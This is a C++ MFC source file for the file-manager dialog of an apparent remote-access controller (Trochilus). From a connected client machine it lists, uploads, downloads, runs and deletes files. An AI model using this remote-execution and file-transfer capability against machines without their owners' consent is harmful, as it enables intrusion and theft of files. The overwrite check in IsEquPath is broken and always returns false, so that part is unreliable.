// FileMgrDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Trochilus.h"
#include "IconLoader.h"
#include "afxdialogex.h"
#include "DownDlg.h"
#include "json/json.h"
#include "FileMgrDlg.h"
#include "FilePanelDlg.h"


// CFileMgrDlg 对话框

IMPLEMENT_DYNAMIC(CFileMgrDlg, CDialogEx)

CFileMgrDlg::CFileMgrDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CFileMgrDlg::IDD, pParent)
{
	m_modname = _T("ModFileManager");
}

CFileMgrDlg::~CFileMgrDlg()
{
}

void CFileMgrDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_RDIC, m_rDicList);
	DDX_Control(pDX, IDC_LIST_RFILE, m_rFileList);
	DDX_Control(pDX, IDC_LIST_LDIC, m_lDicList);
	DDX_Control(pDX, IDC_LIST_LFILE, m_lFileList);
}


BEGIN_MESSAGE_MAP(CFileMgrDlg, CDialogEx)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_RDIC, &CFileMgrDlg::OnNMDblclkListRdic)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LDIC, &CFileMgrDlg::OnNMDblclkListLdic)
	ON_BN_CLICKED(IDC_BUTTON_RUPDIC, &CFileMgrDlg::OnBnClickedButtonRupdic)
	ON_BN_CLICKED(IDC_BUTTON_LUPDIC, &CFileMgrDlg::OnBnClickedButtonLupdic)
	ON_BN_CLICKED(IDC_BUTTON_RREFRESH, &CFileMgrDlg::OnBnClickedButtonRrefresh)
	ON_BN_CLICKED(IDC_BUTTON_LREFRESH, &CFileMgrDlg::OnBnClickedButtonLrefresh)
	ON_BN_CLICKED(IDC_BUTTON_UPLOAD, &CFileMgrDlg::OnBnClickedButtonUpload)
	ON_BN_CLICKED(IDC_BUTTON_DOWN, &CFileMgrDlg::OnBnClickedButtonDown)
	ON_BN_CLICKED(IDC_BUTTON_RUN, &CFileMgrDlg::OnBnClickedButtonRun)
	ON_BN_CLICKED(IDC_BUTTON_DELETE, &CFileMgrDlg::OnBnClickedButtonDelete)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_RFILE, &CFileMgrDlg::OnNMRClickListRfile)
	ON_COMMAND(ID_RFPOP_DOWN, &CFileMgrDlg::OnClickDownFile)
	ON_WM_SIZE()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()

void CFileMgrDlg::HandleModuleMsg( LPCTSTR clientid,UINT nMsg, LPVOID lpContext, LPVOID lpParameter )
{
	CFileMgrDlg* lpDlg = (CFileMgrDlg*)lpParameter;
	return lpDlg->HandleModuleMsgProc(nMsg,lpContext,lpParameter);
}

void CFileMgrDlg::HandleModuleMsgProc(UINT nMsg, LPVOID lpContext, LPVOID lpParameter)
{
	m_csList.Enter();
	{
		if (nMsg == MODULE_MSG_LISTREMOTEFILE)
		{
			HandleRemoteFile(nMsg,lpContext,lpParameter);
		}
		if (nMsg == MODULE_MSG_LISTLOCALFILE)
		{
			HandleLocalFile(nMsg,lpContext,lpParameter);
		}
	}
	m_csList.Leave();

	return;
}
void CFileMgrDlg::HandleLocalFile(UINT nMsg, LPVOID lpContext, LPVOID lpParameter)
{
	CFileMgrDlg* lpDlg = (CFileMgrDlg*)lpParameter;
	m_lDicList.DeleteAllItems();
	m_lFileList.DeleteAllItems();

	InsertFileList((char*)lpContext,FALSE);
}

void CFileMgrDlg::HandleRemoteFile(UINT nMsg, LPVOID lpContext, LPVOID lpParameter)
{
	m_rDicList.DeleteAllItems();
	m_rFileList.DeleteAllItems();

	InsertFileList((char*)lpContext,TRUE);
}



void CFileMgrDlg::GetRemoteList(CString strPath)
{
	if (strPath.GetLength() == 0)
	{
		AsynListDisks(m_clientid,TRUE,HandleModuleMsg,this);
	}
	else
	{
		AsynListFiles(m_clientid,strPath,TRUE,HandleModuleMsg,this);
	}
}
void CFileMgrDlg::GetLocalList(CString strPath)
{
	if (strPath.GetLength() == 0)
	{
		AsynListDisks(m_clientid,FALSE,HandleModuleMsg,this);
	}
	else
	{
		AsynListFiles(m_clientid,strPath,FALSE,HandleModuleMsg,this);
	}
}

void CFileMgrDlg::SetColumn( CListCtrl* list,LPTSTR text,int nCol,int nWidth )
{
	list->DeleteColumn(nCol);
	list->InsertColumn(nCol,text,LVCFMT_CENTER,nWidth,-1);
}

HICON CFileMgrDlg::GetFileIcon(CString strPath)
{
	return CIconLoader::GetInstanceRef().LoadIcon(strPath);
}

void CFileMgrDlg::InsertFileList( char* lpJson,BOOL isRemote )
{
	Json::Reader reader;
	Json::Value root;
	std::string strJson = lpJson;
	reader.parse(lpJson,root);

	if (strJson == "null\n")
	{
		int nId = isRemote ? IDC_EDIT_RCURDIC : IDC_EDIT_LCURDIC;
		CString strCurDir = isRemote ? m_rCurDir : m_lCurDir;
		SetDlgItemText(nId,strCurDir+"\\");

		return;
	}

	//清空原有数据
	CListCtrl* list;
	int nImage = 0;
	
	//修改列字段
	Json::Value j = root[(UINT)0];
	if (j["filetype"] == "disk")
	{
		list = (isRemote ? &m_rDicList : &m_lDicList);
		SetColumn(list,_T("Total"),1,70);
		SetColumn(list,_T("Used"),2,70);
	}
	else if (j["filetype"] == "dir")
	{
		list = (isRemote ? &m_rDicList : &m_lDicList);
		SetColumn(list,_T("Size"),1,70);
		SetColumn(list,_T("Edit Time"),2,70);
	}

	//循环插入
	for (UINT i = 0 ; i < root.size() ; i++)
	{
		Json::Value value = root[i];

		__time64_t time = atoi(value["edittime"].asString().c_str());

		if (value["filetype"] == "disk")
		{
			nImage = m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_HARD));
		}
		else if (value["filetype"] == "dir")
		{
			value["edittime"] = CStringA(common::FormatSystemTime(time)).GetBuffer();

			nImage = m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ICON_FOLDER));
		}
		else if (value["filetype"] == "file")
		{
			list = (isRemote ? &m_rFileList : &m_lFileList);
			//获取文件图标信息
			nImage = m_ImageList.Add(GetFileIcon(a2t(value["filename"].asCString())));

			value["edittime"] = CStringA(common::FormatSystemTime(time)).GetBuffer();
		}

		int nId = isRemote ? IDC_EDIT_RCURDIC : IDC_EDIT_LCURDIC;
		CString strCurDic = CString(value["dir"].asCString());
		strCurDic.Replace(_T("*.*"),_T(""));

		SetDlgItemText(nId,strCurDic);

		int nIndex = list->GetItemCount();
		list->InsertItem(nIndex,CString(value["filename"].asString().c_str()),nImage);
		list->SetItemText(nIndex,1,CString(value["size"].asString().c_str()));
		list->SetItemText(nIndex,2,CString(value["edittime"].asString().c_str()));
	}
}

void CFileMgrDlg::InitView()
{
	m_ImageList.Create(16,16,ILC_COLOR8|ILC_MASK,2,1);

	m_rDicList.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
	m_rDicList.InsertColumn(0,_T("Name"),LVCFMT_CENTER,80,-1);
	m_rDicList.InsertColumn(1,_T("Total"),LVCFMT_CENTER,70,-1);
	m_rDicList.InsertColumn(2,_T("Used"),LVCFMT_CENTER,70,-1);
	m_rDicList.SetImageList(&m_ImageList,LVSIL_SMALL);

	m_lDicList.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
	m_lDicList.InsertColumn(0,_T("Name"),LVCFMT_CENTER,80,-1);
	m_lDicList.InsertColumn(1,_T("Total"),LVCFMT_CENTER,70,-1);
	m_lDicList.InsertColumn(2,_T("Used"),LVCFMT_CENTER,70,-1);
	m_lDicList.SetImageList(&m_ImageList,LVSIL_SMALL);

	m_rFileList.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
	m_rFileList.InsertColumn(0,_T("File Name"),LVCFMT_CENTER,300,-1);
	m_rFileList.InsertColumn(1,_T("File Size"),LVCFMT_CENTER,150,-1);
	m_rFileList.InsertColumn(2,_T("Edit Time"),LVCFMT_CENTER,300,-1);
	m_rFileList.SetImageList(&m_ImageList,LVSIL_SMALL);

	m_lFileList.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
	m_lFileList.InsertColumn(0,_T("File Name"),LVCFMT_CENTER,300,-1);
	m_lFileList.InsertColumn(1,_T("File Size"),LVCFMT_CENTER,150,-1);
	m_lFileList.InsertColumn(2,_T("Edit Time"),LVCFMT_CENTER,300,-1);
	m_lFileList.SetImageList(&m_ImageList,LVSIL_SMALL);
}

void CFileMgrDlg::InitData()
{
	GetLocalList(_T(""));
	GetRemoteList(_T(""));
}
BOOL CFileMgrDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	InitView();
	InitResize();
	InitData();

	return TRUE;
}


void CFileMgrDlg::OnNMDblclkListRdic(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	int nIndex = pNMItemActivate->iItem;

	CString strPath;
	GetDlgItemText(IDC_EDIT_RCURDIC,strPath);

	if (strPath.GetLength() == 0)
	{
		strPath = m_rDicList.GetItemText(nIndex,0);
		int nPos = strPath.Find(_T(":"));
		strPath = strPath.GetBufferSetLength(nPos+1);
	}
	else
	{
		strPath += m_rDicList.GetItemText(nIndex,0);
	}
	
	m_rCurDir = strPath;
	GetRemoteList(strPath+_T("\\*.*"));

	*pResult = 0;
}


void CFileMgrDlg::OnNMDblclkListLdic(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	int nIndex = pNMItemActivate->iItem;

	CString strPath;
	GetDlgItemText(IDC_EDIT_LCURDIC,strPath);
	if (strPath.GetLength() == 0)
	{
		strPath = m_lDicList.GetItemText(nIndex,0);
		int nPos = strPath.Find(_T(":"));
		strPath = strPath.GetBufferSetLength(nPos+1);
	}
	else
	{
		strPath += m_lDicList.GetItemText(nIndex,0);
	}
	m_lCurDir = strPath;
	GetLocalList(strPath+_T("\\*.*"));

	*pResult = 0;
}


void CFileMgrDlg::OnBnClickedButtonRupdic()
{
	CString strPath;
	GetDlgItemText(IDC_EDIT_RCURDIC,strPath);

	if (strPath.GetLength() == 3)
	{
		GetRemoteList(_T(""));
		return ;
	}

	for (int i = 0 ; i < 2 ; i++)
	{
		int nPos = strPath.ReverseFind(_T('\\'));
		strPath = strPath.GetBufferSetLength(nPos);
	}


	GetRemoteList(strPath+_T("\\*.*"));
}


void CFileMgrDlg::OnBnClickedButtonLupdic()
{
	CString strPath;
	GetDlgItemText(IDC_EDIT_LCURDIC,strPath);

	if (strPath.GetLength() == 3)
	{
		GetLocalList(_T(""));
		return ;
	}

	for (int i = 0 ; i < 2 ; i++)
	{
		int nPos = strPath.ReverseFind(_T('\\'));
		strPath = strPath.GetBufferSetLength(nPos);
	}


	GetLocalList(strPath+_T("\\*.*"));
}


void CFileMgrDlg::OnBnClickedButtonRrefresh()
{
	CString strPath;
	GetDlgItemText(IDC_EDIT_RCURDIC,strPath);
	if (strPath.GetLength() == 0)
	{
		GetRemoteList(_T(""));
		return ;
	}
	GetRemoteList(strPath+_T("*.*"));
}


void CFileMgrDlg::OnBnClickedButtonLrefresh()
{
	CString strPath;
	GetDlgItemText(IDC_EDIT_LCURDIC,strPath);

	if (strPath.GetLength() == 0)
	{
		GetLocalList(_T(""));
		return ;
	}

	GetLocalList(strPath+_T("*.*"));
}


void CFileMgrDlg::OnBnClickedButtonUpload()
{
	CString strLocal;
	CString strRemote;

	POSITION LPos = m_lFileList.GetFirstSelectedItemPosition();

	if (LPos == 0)
	{
		AfxMessageBox(_T("No selected!"));
		return;
	}

	GetDlgItemText(IDC_EDIT_LCURDIC,strLocal);
	GetDlgItemText(IDC_EDIT_RCURDIC,strRemote);

	if ((!strLocal.GetLength()) || (!strRemote.GetLength()))
	{
		AfxMessageBox(_T("Path can't be NULL!"));
		return;
	}

	int nLItem= m_lFileList.GetNextSelectedItem(LPos);

	CString filename = m_lFileList.GetItemText(nLItem,0);

	if (IsEquPath(filename,TRUE))
	{
		int ret = AfxMessageBox(_T("Overwrite？"),MB_YESNO);

		if (ret == IDNO)
			return;
	}

	strRemote += filename;
	strLocal += filename;

	PutFileToClient(m_clientid,strLocal,strRemote);

	((CFilePanelDlg*)m_panel)->m_TabCtrl.SetCurSel(1);
	((CFilePanelDlg*)m_panel)->m_FileMgr.ShowWindow(FALSE);
	((CFilePanelDlg*)m_panel)->m_TransInfo.ShowWindow(TRUE);
}


void CFileMgrDlg::OnBnClickedButtonDown()
{
	CString strLocal;
	CString strRemote;
	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
	POSITION RPos = m_rFileList.GetFirstSelectedItemPosition();

	if (RPos == 0)
	{
		AfxMessageBox(_T("No selected!"));
		return;
	}

	GetDlgItemText(IDC_EDIT_LCURDIC,strLocal);
	GetDlgItemText(IDC_EDIT_RCURDIC,strRemote);

	if ((!strLocal.GetLength()) || (!strRemote.GetLength()))
	{
		AfxMessageBox(_T("Path can't be NULL!"));
		return;
	}

	int nLItem= m_rFileList.GetNextSelectedItem(RPos);

	CString filename = m_rFileList.GetItemText(nLItem,0);

	if (IsEquPath(filename,FALSE))
	{
		int ret = AfxMessageBox(_T("Overwrite？"),MB_YESNO);
		
		if (ret == IDNO)
			return;
	}

	strRemote += filename;
	strLocal += filename;

	GetFileToServer(m_clientid,strRemote,strLocal);

	((CFilePanelDlg*)m_panel)->m_TabCtrl.SetCurSel(1);
	((CFilePanelDlg*)m_panel)->m_FileMgr.ShowWindow(FALSE);
	((CFilePanelDlg*)m_panel)->m_TransInfo.ShowWindow(TRUE);
}


void CFileMgrDlg::OnBnClickedButtonRun()
{
	CString strRemote;

	POSITION RPos = m_rFileList.GetFirstSelectedItemPosition();

	if (RPos == 0)
	{
		AfxMessageBox(_T("No selected!"));
		return;
	}

	GetDlgItemText(IDC_EDIT_RCURDIC,strRemote);

	int nLItem= m_rFileList.GetNextSelectedItem(RPos);

	CString filename = m_rFileList.GetItemText(nLItem,0);

	strRemote += filename;

	RunRemoteFile(m_clientid,strRemote);

	CString notify;
	notify.Format(_T("Run %s !"),strRemote);

	AfxMessageBox(notify);
}


void CFileMgrDlg::OnBnClickedButtonDelete()
{
	CString strRemote;

	POSITION RPos = m_rFileList.GetFirstSelectedItemPosition();

	if (RPos == 0)
	{
		AfxMessageBox(_T("No selected!"));
		return;
	}
	GetDlgItemText(IDC_EDIT_RCURDIC,strRemote);

	int nLItem= m_rFileList.GetNextSelectedItem(RPos);

	CString filename = m_rFileList.GetItemText(nLItem,0);

	strRemote += filename;

	DeleteRemoteFile(m_clientid,strRemote);

	CString notify;
	notify.Format(_T("Delete %s !"),strRemote);

	AfxMessageBox(notify);
}

BOOL CFileMgrDlg::IsEquPath( LPCTSTR filename,BOOL isRemote )
{
	CListCtrl* list = isRemote ? &m_rFileList : &m_lFileList;

	int nCount = list->GetItemCount();

	BOOL ret = FALSE;

	for(int j = 0 ; j < nCount ; j++)
	{
		CString str1 = list->GetItemText(j,0);

		if (str1+_T(".cfg") == filename )
		{
			ret = FALSE;
			break;
		}

		if (str1 == filename)
			ret = TRUE;
	}

	return FALSE;
}

void CFileMgrDlg::OnNMRClickListRfile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	//防止在空白区点击弹出菜单
	if (m_rFileList.GetSelectedCount() > 0)
	{
		return;
	}

	CMenu menu, *pPopup;

	menu.LoadMenu(IDR_MENU_RFLIST);
	pPopup = menu.GetSubMenu(0);

	CPoint myPoint;
	ClientToScreen(&myPoint);
	GetCursorPos(&myPoint);

	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON, myPoint.x, myPoint.y,this);

	*pResult = 0;
}

void CFileMgrDlg::OnClickDownFile()
{
	CString strPath;
	GetDlgItemText(IDC_EDIT_RCURDIC,strPath);

	if (strPath == _T(""))
	{
		AfxMessageBox(_T("Path Faild!"));
		return;
	}

	CDownDlg dlg(m_clientid,strPath);

	dlg.DoModal();
	

	//发送下载消息

}
void CFileMgrDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	m_resizer.Move();
}

void CFileMgrDlg::InitResize()
{

	static CResizer::CBorderInfo s_bi[] = {
		{IDC_BUTTON_LUPDIC,
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_BUTTON_LREFRESH,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_LIST_LDIC,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_LIST_LFILE,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_STATIC_DIC1,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_EDIT_LCURDIC,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_BUTTON_UPLOAD,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_BUTTON_DOWN,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_LIST_RDIC,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eTop},
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_LIST_RFILE,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eTop},
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}}
// 		,
// 		{IDC_STATIC_R,    
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}}
// 		,
// 		{IDC_STATIC_L,    
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
// 		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}}
	};

	const int nSize = sizeof(s_bi)/sizeof(s_bi[0]);
	m_resizer.Init(m_hWnd, NULL, s_bi, nSize);
}

void CFileMgrDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	__super::OnSysCommand(nID, lParam);
}
